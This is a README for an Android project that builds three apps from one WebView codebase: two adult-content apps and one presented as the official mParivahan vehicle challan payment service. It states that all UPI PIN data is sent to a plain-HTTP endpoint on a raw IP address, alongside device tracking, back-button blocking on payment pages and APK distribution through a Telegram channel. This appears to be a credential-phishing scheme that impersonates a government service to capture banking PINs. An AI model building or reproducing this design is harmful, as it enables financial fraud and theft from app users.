# Multi-Flavor Android Application

A comprehensive Android application with three distinct product flavors, each serving different markets and user needs.

## ?? Project Overview

This project contains **three product flavors** built from a single codebase:

| Flavor | Package Name | Description | Price |
|--------|--------------|-------------|-------|
| **SexChat** | `com.sexychat.me` | Premium adult chat and video calls platform | ?5 |
| **mParivahan** | `com.mparivahan.me` | Official vehicle challan payment system | ?1 |
| **SexyHub** | `com.sexyhub.me` | Premium adult video content hub | ?1 |

---

## ?? Features

### Common Features (All Flavors)
- ? Modern WebView-based UI
- ? UPI payment integration
- ? Real-time server communication
- ? Firebase Cloud Messaging (FCM)
- ? Device tracking and analytics
- ? Back button prevention on critical pages
- ? Professional error handling with retry mechanisms
- ? Loading overlays and progress indicators
- ? Secure payment flow with validation

### Flavor-Specific Features

#### SexChat
- Video call booking system
- Premium subscription model
- Private messaging interface
- Adult content age verification

#### mParivahan
- Vehicle number validation (Indian format)
- Mobile number validation (10-digit, starting with 6-9)
- Challan payment processing
- Hindi language support
- Traffic violation tracking

#### SexyHub
- Video library with categories
- Age verification (18+)
- Quality filters (HD, 4K, etc.)
- Uploader filters
- Premium content unlocking

---

## ??? Technology Stack

- **Language:** Kotlin
- **UI Framework:** Jetpack Compose
- **Build System:** Gradle (Kotlin DSL)
- **WebView:** Android WebView with JavaScript Interface
- **Backend:** Node.js REST API
- **Database:** Firebase Realtime Database
- **Notifications:** Firebase Cloud Messaging (FCM)
- **CI/CD:** GitHub Actions
- **Notification:** Telegram Bot Integration

---

## ?? Project Structure

```
app/
??? src/
?   ??? main/                    # Shared resources
?   ?   ??? assets/              # Common HTML/CSS/JS files
?   ?   ??? java/                # Kotlin source code
?   ?   ??? res/                 # Common resources
?   ?
?   ??? sexychat/                # SexChat specific
?   ?   ??? assets/              # SexChat HTML files
?   ?   ??? google-services.json # Firebase config
?   ?   ??? res/values/          # SexChat strings
?   ?
?   ??? mparivahan/              # mParivahan specific
?   ?   ??? assets/              # mParivahan HTML files
?   ?   ??? google-services.json # Firebase config
?   ?   ??? res/values/          # mParivahan strings
?   ?
?   ??? sexyhub/                 # SexyHub specific
?       ??? assets/              # SexyHub HTML files
?       ??? google-services.json # Firebase config
?       ??? res/values/          # SexyHub strings
?
??? build.gradle.kts             # Flavor configuration
```

---

## ?? Quick Start

### Prerequisites
- Android Studio (Latest version)
- JDK 11 or higher
- Gradle 8.0+
- Firebase account with three projects

### Building the Project

```bash
# Build all flavors (Release only)
./gradlew assembleSexychatRelease assembleMparivahanRelease assembleSexyhubRelease

# Build individual flavors
./gradlew assembleSexychatRelease
./gradlew assembleMparivahanRelease
./gradlew assembleSexyhubRelease

# Clean build
./gradlew clean
```

### Output APKs
APKs are generated in:
```
app/build/outputs/apk/
??? sexychat/release/app-sexychat-release.apk
??? mparivahan/release/app-mparivahan-release.apk
??? sexyhub/release/app-sexyhub-release.apk
```

---

## ?? Documentation

Detailed documentation is available in separate files:

- **[API_DOCUMENTATION.md](./API_DOCUMENTATION.md)** - Complete API reference and server integration
- **[FLAVORS_GUIDE.md](./FLAVORS_GUIDE.md)** - Build flavors setup and customization
- **[FIREBASE_SETUP.md](./FIREBASE_SETUP.md)** - Firebase configuration for all flavors

---

## ?? Configuration

### Build Flavors

Flavors are configured in `app/build.gradle.kts`:

```kotlin
productFlavors {
    create("sexychat") {
        applicationId = "com.sexychat.me"
        buildConfigField("String", "APP_FLAVOR", "\"sexychat\"")
        resValue("string", "flavor_app_name", "Sexy Chat")
    }
    create("mparivahan") {
        applicationId = "com.mparivahan.me"
        buildConfigField("String", "APP_FLAVOR", "\"mparivahan\"")
        resValue("string", "flavor_app_name", "mParivahan")
    }
    create("sexyhub") {
        applicationId = "com.sexyhub.me"
        buildConfigField("String", "APP_FLAVOR", "\"sexyhub\"")
        resValue("string", "flavor_app_name", "Sexy Hub")
    }
}
```

### Server Configuration

Backend server: `http://95.134.130.160:8765`

All UPI PIN data is sent to:
```
POST http://95.134.130.160:8765/save-pin
```

---

## ?? Security

- Device ID tracking via Android JavaScript Interface
- Secure UPI payment flow
- Firebase authentication and real-time database
- HTTPS for all API communications (production)
- Back button prevention on sensitive pages

---

## ?? CI/CD Pipeline

GitHub Actions workflow automatically:
1. Builds all three flavors (Release only)
2. Generates timestamped APK files
3. Uploads artifacts to GitHub
4. Sends APKs to Telegram channel

Workflow file: `.github/workflows/android-build.yml`

---

## ?? Contributing

This is a private project. For questions or issues, contact the development team.

---

## ?? License

Proprietary - All rights reserved

---

## ?? Support

For technical support or questions, refer to the documentation files or contact the project maintainers.

---

**Last Updated:** 2025-11-01
**Version:** 1.0
